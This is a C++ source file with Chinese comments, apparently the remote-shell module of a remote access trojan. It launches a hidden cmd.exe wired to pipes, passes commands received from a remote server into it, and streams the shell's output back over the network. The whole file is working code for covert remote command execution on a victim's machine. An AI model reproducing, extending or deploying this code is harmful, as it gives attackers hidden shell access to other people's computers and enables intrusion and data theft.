#include "CmdManager.h"



CCmdManager::CCmdManager(_CIOCPClient* IOCPClient) :CManager(IOCPClient)
{
	printf("CCmdManager()调用\r\n");
	//创建一组管道与Cmd进程进行CMD通讯
	
	SECURITY_ATTRIBUTES SecurityAttributes = { 0 };
	SecurityAttributes.nLength = sizeof(SecurityAttributes);
	SecurityAttributes.lpSecurityDescriptor = NULL;
	SecurityAttributes.bInheritHandle = TRUE;
	
	//m_ThreadHandle = NULL;
	m_CmdProcessHandle = NULL;//保存Cmd进程的进程句柄和主线程句柄
	m_CmdThreadHandle = NULL;
	m_CmdCodeLength = 0;
	m_ReadHandle1 = NULL;//Client
	m_WriteHandle1 = NULL;//Client
	m_ReadHandle2 = NULL;//Cmd
	m_WriteHandle2 = NULL;//Cmd
	
	if (!CreatePipe(&m_ReadHandle1, &m_WriteHandle2, &SecurityAttributes, 0))
	{
		if (m_ReadHandle1 != NULL)
		{
			CloseHandle(m_ReadHandle1);
		}
		if (m_WriteHandle2 != NULL)
		{
			CloseHandle(m_WriteHandle2);
		}
		return;
	}
	if (!CreatePipe(&m_ReadHandle2, &m_WriteHandle1, &SecurityAttributes, 0))
	{
		if (m_ReadHandle2 != NULL)
		{
			CloseHandle(m_ReadHandle2);
		}
		if (m_WriteHandle1 != NULL)
		{
			CloseHandle(m_WriteHandle1);
		}
		return;
	}
	//创建CMD子进程并且不显示界面
	//获得Cmd Path
	char CmdFullPath[MAX_PATH] = { 0 };

	GetSystemDirectory(CmdFullPath, MAX_PATH);
	//cmd.exe路径是写死的 C:\windows\system32
	strcat(CmdFullPath, "\\cmd.exe");                             
	//C:\windows\system32\cmd.exe

	//1 Cmd Input Output 要和管道对应上
	//2 Cmd Hide

	STARTUPINFO         StartupInfo = { 0 };
	PROCESS_INFORMATION ProcessInfo = { 0 };

	//memset((void*)&StartupInfo, 0, sizeof(StartupInfo));
	//memset((void*)&ProcessInfo, 0, sizeof(ProcessInfo));

	//重要->一定要初始化该成员(自己)
	StartupInfo.cb = sizeof(STARTUPINFO);

	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput = m_ReadHandle2;                           
	//将管道数据向Cmd赋值
	StartupInfo.hStdOutput = StartupInfo.hStdError = m_WriteHandle2;
	/*
	Clinet         Cmd
	Write1 ------> Read2
	Read1  <------ Write2
	*/
	StartupInfo.wShowWindow = SW_HIDE;   //窗口隐藏
										//启动Cmd进程
										//3 继承
										//创建Cmd进程
	if (!CreateProcess(CmdFullPath, NULL, NULL, NULL, TRUE,
		NORMAL_PRIORITY_CLASS, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		CloseHandle(m_ReadHandle1);
		CloseHandle(m_WriteHandle1);
		CloseHandle(m_ReadHandle2);
		CloseHandle(m_WriteHandle2);
		return;
	}

	m_CmdProcessHandle = ProcessInfo.hProcess;    //保存Cmd进程的进程句柄和主线程句柄
	m_CmdThreadHandle  = ProcessInfo.hThread;
	
	

	//Client Server
	BYTE IsToken = CLIENT_CMD_MANAGER_REPLY;            //包含头文件 Common.h     
	m_IOCPClient->OnSending((char*)&IsToken, 1);
	m_IsLoop = TRUE;

	WaittingForDialogOpen();

	//创建读取管道中的数据的线程
	m_ThreadHandle = CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)ReceiveProceduce, (LPVOID)this, 0, NULL);   //Client 读取管道数据  
																		//回调*/

}

CCmdManager::~CCmdManager()
{
	printf("~CCmdManager()调用\r\n");
	
	m_IsLoop = FALSE;
	Sleep(10);
	TerminateThread(m_CmdThreadHandle, 0);     //结束我们自己创建的Cmd线程
	TerminateProcess(m_CmdProcessHandle, 0);   //结束我们自己创建的Cmd进程

	Sleep(100);

	if (m_ReadHandle1 != NULL)
	{
		DisconnectNamedPipe(m_ReadHandle1);
		CloseHandle(m_ReadHandle1);
		m_ReadHandle1 = NULL;
	}
	if (m_WriteHandle1 != NULL)
	{
		DisconnectNamedPipe(m_WriteHandle1);
		CloseHandle(m_WriteHandle1);
		m_WriteHandle1 = NULL;
	}
	if (m_ReadHandle2 != NULL)
	{
		DisconnectNamedPipe(m_ReadHandle2);
		CloseHandle(m_ReadHandle2);
		m_ReadHandle2 = NULL;
	}
	if (m_WriteHandle2 != NULL)
	{
		DisconnectNamedPipe(m_WriteHandle2);
		CloseHandle(m_WriteHandle2);
		m_WriteHandle2 = NULL;
	}
}

VOID CCmdManager::HandleIO(PBYTE BufferData, ULONG BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}
	default:
	{
		//接收由服务端发送过来的数据
		//将该数据写进管道
		unsigned long	ReturnLength = 0;
		m_CmdCodeLength = BufferLength-2;
		if (WriteFile(m_WriteHandle1, BufferData, BufferLength, &ReturnLength, NULL))
		{

		}
		break;
	}
	}
}

DWORD CCmdManager::ReceiveProceduce(LPVOID ParameterData)
{
	unsigned long   ReturnLength = 0;
	char	v1[0x400] = { 0 };
	DWORD	BufferLength = 0;
	CCmdManager *This = (CCmdManager*)ParameterData;

	while (This->m_IsLoop)
	{
		Sleep(100);
		//这里检测是否有数据  数据的大小是多少
		while (PeekNamedPipe(This->m_ReadHandle1,     
			v1, sizeof(v1), &ReturnLength, &BufferLength, NULL))//不是阻塞
		{
			//如果没有数据就跳出本本次循环
			if (ReturnLength <= 0)
			{
				break;
			}
				
			memset(v1, 0, sizeof(v1));

			LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, BufferLength);

			
			//读取管道数据
			ReadFile(This->m_ReadHandle1,
				(LPVOID)(BufferData), BufferLength, &ReturnLength, NULL);
			

			This->m_IOCPClient->OnSending((char*)BufferData+ This->m_CmdCodeLength, ReturnLength- This->m_CmdCodeLength);
			LocalFree(BufferData);

		}
	}
	printf( "CCmdManager::ReceiveProceduce()退出\r\n" );
	return 0;
}